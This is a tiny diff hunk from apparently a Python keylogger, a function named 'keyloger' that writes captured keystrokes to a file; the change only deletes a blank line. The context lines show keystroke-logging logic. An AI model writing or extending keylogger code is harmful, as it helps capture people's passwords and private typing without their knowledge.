@@ -83,7 +83,6 @@ def keyloger():
                 if k.find("space") > 0:
                     f.write('\n')
                     f.close()
-                    
                 elif k.find("Key") == -1:
                     f.write(k)
                     f.close()
